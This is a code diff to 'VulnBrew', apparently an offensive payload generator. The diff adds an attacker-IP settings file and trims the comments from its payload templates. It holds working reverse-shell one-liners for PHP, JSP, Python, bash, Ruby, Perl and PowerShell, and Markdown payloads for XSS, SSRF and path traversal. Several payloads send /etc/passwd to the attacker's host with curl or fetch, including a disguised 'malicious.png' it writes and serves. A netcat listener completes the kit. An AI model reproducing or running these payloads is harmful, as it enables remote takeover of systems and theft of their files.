@@ -1,8 +1,39 @@
 import os
 import subprocess
+import json
+import os
+
+SETTINGS_FILE = "settings.json" # file in same dir as main.py
+
+def load_settings():
+    """Load settings from the settings.json file."""
+    if not os.path.exists(SETTINGS_FILE):
+        save_settings({"attacker_ip": "127.0.0.1"})
+    with open(SETTINGS_FILE, "r") as f:
+        return json.load(f)
+
+def save_settings(settings):
+    """Save settings to the settings.json file."""
+    with open(SETTINGS_FILE, "w") as f:
+        json.dump(settings, f, indent=4)
+
+# TO change the attacker IP in the settings.json file - makes it more repeatable for testing
+def set_attacker_ip(ip=None):
+    """Allow the user to set their attacker IP address via a parameter."""
+    settings = load_settings()
+    if not ip:
+        print("[X] No IP address provided. Usage: setip <ip>")
+        return
+
+    settings["attacker_ip"] = ip
+    save_settings(settings)
+    print(f"[✔] Attacker IP updated to {ip}")
+
+
 
 def display_logo():
     """Display the VulnBrew ASCII art logo and introductory message."""
+    settings = load_settings()
     print(r"""
              (    (
               )   )
@@ -17,15 +48,19 @@ def display_logo():
             //     \\
     """)
     print("         V U L N  B R E W")
-    print("\nType 'help' in the console to see available commands.\n")
+    print("\n")
+    ip = settings["attacker_ip"]
+    print(f"Attacker IP:    {ip}")
+    print(f"Default Port:   (N/A)")
 
-def get_payload(extension, ip, port):
+def get_payload(extension, ip, port, **kwargs):
     """Generate the appropriate payload based on file extension.
     
     Args:
         extension (str): The file extension for the payload.
         ip (str): The attacker's IP address.
         port (str): The port to be used for the reverse shell.
+        kwargs: Additional parameters for specific payloads.
 
     Returns:
         str: The payload or a message indicating no payload is available for the extension.
@@ -33,58 +68,32 @@ def get_payload(extension, ip, port):
     # Predefined payloads based on file extension
     payloads = {
         ".php": (
-            # PHP payload for reverse shell
-            # This uses PHP's `exec` function to execute a bash command.
-            # The bash command establishes a reverse shell connection to the given IP and port.
             f"<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"');?>"
         ),
         ".jsp": (
-            # JSP payload for reverse shell
-            # This uses Java's `Runtime.getRuntime().exec` to execute a bash command.
-            # The bash command establishes a reverse shell connection to the given IP and port.
             f"<% Runtime.getRuntime().exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\"); %>"
         ),
         ".py": (
-            # Python payload for reverse shell
-            # This uses Python's socket and os libraries to create a reverse shell.
-            # It connects to the given IP and port, and redirects input/output to the attacker's machine.
             f"import socket,os,pty\ns=socket.socket()\ns.connect((\'{ip}\',{port}))\n"
             f"os.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\npty.spawn('/bin/bash')"
         ),
         ".md": {
             "image_ssrf": (
-                # Markdown payload for SSRF using image links
-                # When the Markdown parser renders this, it makes a request to the specified IP and port.
-                # Useful for testing if the target system can make outbound requests (e.g., SSRF testing).
                 f"![exploit](http://{ip}:{port}/malicious.png)"
             ),
             "html_xss": (
-                # Markdown payload with embedded HTML for XSS
-                # If the Markdown renderer allows inline HTML, this injects a script to trigger XSS.
-                # Useful for targeting web-based Markdown viewers or web applications.
                 f"![alt text](x)\n<script>\nalert('XSS Exploit Triggered!');\n</script>"
             ),
             "code_injection": (
-                # Markdown payload with command injection via code blocks
-                # Targets Markdown renderers or users who may copy and execute the provided code.
-                # Demonstrates potential command injection vulnerabilities.
                 f"```bash\n; curl http://{ip}:{port}/ -d \"$(cat /etc/passwd)\"\n```"
             ),
             "file_inclusion": (
-                # Markdown payload for local file inclusion via path traversal
-                # If the Markdown renderer processes local file paths, this may expose sensitive files.
-                # Useful for testing file inclusion vulnerabilities in Markdown parsers.
                 "![exploit](../../../../../etc/passwd)"
             ),
             "javascript_link": (
-                # Markdown payload with a malicious JavaScript hyperlink
-                # Targets Markdown renderers that allow JavaScript links in anchors.
-                # Useful for XSS attacks in browsers or applications with insufficient sanitization.
                 "[Click Me](javascript:alert('Exploit Successful!'))"
             ),
             "path_traversal": (
-                # Markdown payload for path traversal
-                # This attempts to fetch /etc/passwd via a traversal attack.
                 f"<script>\nfetch('/../../../../../etc/passwd')\n"
                 f"  .then(response => response.text())\n"
                 f"  .then(data => {{\n"
@@ -96,9 +105,10 @@ def get_payload(extension, ip, port):
                 f"  .catch(error => console.error('Error fetching /etc/passwd:', error));\n</script>"
             ),
             "lfi": (
-                # Markdown payload for Local File Inclusion (LFI)
-                # Attempts to fetch /etc/passwd via a vulnerable LFI endpoint.
-                f"<script>\nfetch('/file?path=/etc/passwd')\n"
+                f"<script>\n"
+                f"const targetURL = \"{kwargs.get('target_url', '/file')}\";\n"
+                f"const paramKey = \"{kwargs.get('param_key', 'path')}\";\n"
+                f"fetch(`${{targetURL}}?${{paramKey}}=/etc/passwd`)\n"
                 f"  .then(response => response.text())\n"
                 f"  .then(data => {{\n"
                 f"    fetch('http://{ip}:{port}/', {{\n"
@@ -110,39 +120,25 @@ def get_payload(extension, ip, port):
             )
         },
         ".sh": (
-            # Bash script payload for reverse shell
-            # This uses a bash command to redirect input/output to the attacker's machine.
-            # It establishes a reverse shell connection to the given IP and port.
             f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
         ),
         ".rb": (
-            # Ruby payload for reverse shell
-            # Uses Ruby's TCPSocket to establish a reverse shell connection.
-            # Suitable for systems with Ruby installed.
             f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'"
         ),
         ".ps1": (
-            # PowerShell payload for reverse shell
-            # Targets Windows systems using PowerShell scripting.
-            # Creates a reverse shell connection back to the attacker's machine.
             f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"
         ),
         ".pl": (
-            # Perl payload for reverse shell
-            # Uses Perl's socket functionality to create a reverse shell connection.
-            # Useful for legacy systems with Perl installed.
             f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
         ),
     }
     return payloads.get(extension, f"# No payload available for {extension}")
 
-def generate_payload():
+def generate_payload(): # New functionality surrounding settings.json file has been done here
     """Interactively generate a payload."""
-    print("\n[!] Generate a Payload")
-    ip = input("[>] Enter the IP address for the payload (public/accessible IP): ").strip()
-    if not ip:
-        print("[X] IP address cannot be empty.")
-        return
+    settings = load_settings()
+    ip = settings["attacker_ip"]
+    print(f"[!] Using attacker IP: {ip}")
 
     port = input("[>] Enter the port for the reverse shell: ").strip()
     if not port.isdigit():
@@ -175,8 +171,15 @@ def generate_payload():
         except (IndexError, ValueError):
             print("[X] Invalid selection. Aborting.")
             return
+
+        # For LFI, ask for additional parameters
+        kwargs = {}
+        if md_exploit == "lfi":
+            kwargs['target_url'] = input("[>] Enter the target URL endpoint (e.g., /file): ").strip()
+            kwargs['param_key'] = input("[>] Enter the parameter key for file inclusion (e.g., path): ").strip()
     else:
         md_exploit = None
+        kwargs = {}
 
     filename = input("[>] Enter the output filename (e.g., exploit): ").strip() + extension
     if os.path.exists(filename):
@@ -187,7 +190,7 @@ def generate_payload():
 
     # Get the appropriate payload
     if extension == ".md":
-        payload = get_payload(extension, ip, port).get(md_exploit, f"# No payload available for {md_exploit}")
+        payload = get_payload(extension, ip, port, **kwargs).get(md_exploit, f"# No payload available for {md_exploit}")
     else:
         payload = get_payload(extension, ip, port)
 
@@ -219,16 +222,53 @@ def setup_listener(port):
     os.system(f"nc -lvnp {port}")
 
 def start_http_server(port):
-    """Start an HTTP server to host payloads."""
+    """Start an HTTP server to host payloads, optionally hosting malicious.png."""
+    serve_malicious = input("[>] Do you want to host a malicious.png file? (y/n): ").strip().lower() == 'y'
+    
+    if serve_malicious:
+        # Create the malicious.png file
+        payload_content = """
+<script>
+  console.log("malicious.png payload fetched!");
+  fetch('/etc/passwd')
+    .then(response => {
+      console.log("Fetch request successful:", response);
+      return response.text();
+    })
+    .then(data => {
+      console.log("Fetched data:", data);
+      fetch('http://<your-ip>:<your-port>/', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ fileContents: data })
+      })
+      .then(() => console.log("Data sent to attacker successfully"))
+      .catch(error => console.error("Error sending data:", error));
+    })
+    .catch(error => console.error("Error fetching /etc/passwd:", error));
+</script>
+"""
+        with open('malicious.png', 'w') as f:
+            f.write(payload_content)
+        print("[✔] Created malicious.png file.")
+
+    # Start the HTTP server
     print(f"[!] Starting HTTP server on port {port}...")
     subprocess.run(["python3", "-m", "http.server", str(port)])
+
 
 def console():
     """Interactive command console."""
     print("\nWelcome to VulnBrew Console! Type 'help' for a list of commands.\n")
     while True:
         command = input("VulnBrew> ").strip().lower()
-        if command == "generate":
+        if command.startswith("setip"):
+            try:
+                ip = command.split()[1]
+                set_attacker_ip(ip)
+            except IndexError:
+                print("[X] Usage: setip <ip>")
+        elif command == "generate":
             generate_payload()
         elif command.startswith("listener"):
             try:
@@ -245,11 +285,12 @@ def console():
         elif command == "help":
             print("""
 Available Commands:
-  generate          - Generate a new payload
-  listener <port>   - Set up a reverse shell listener on the specified port
-  http <port>       - Start an HTTP server on the specified port
-  exit              - Exit the console
-  help              - Show this help message
+  generate              - Generate a new payload
+  setip     <ip>        - Set your attacker IP address
+  listener  <port>      - Set up a reverse shell listener on the specified port
+  http      <port>      - Start an HTTP server on the specified port
+  exit                  - Exit the console
+  help                  - Show this help message
             """)
         elif command == "exit":
             print("Exiting VulnBrew. Goodbye!")
@@ -257,6 +298,9 @@ Available Commands:
         else:
             print("[X] Unknown command. Type 'help' for a list of commands.")
 
+
 if __name__ == "__main__":
+    if not os.path.exists(SETTINGS_FILE):
+        save_settings({"attacker_ip": "127.0.0.1"})
     display_logo()
     console()
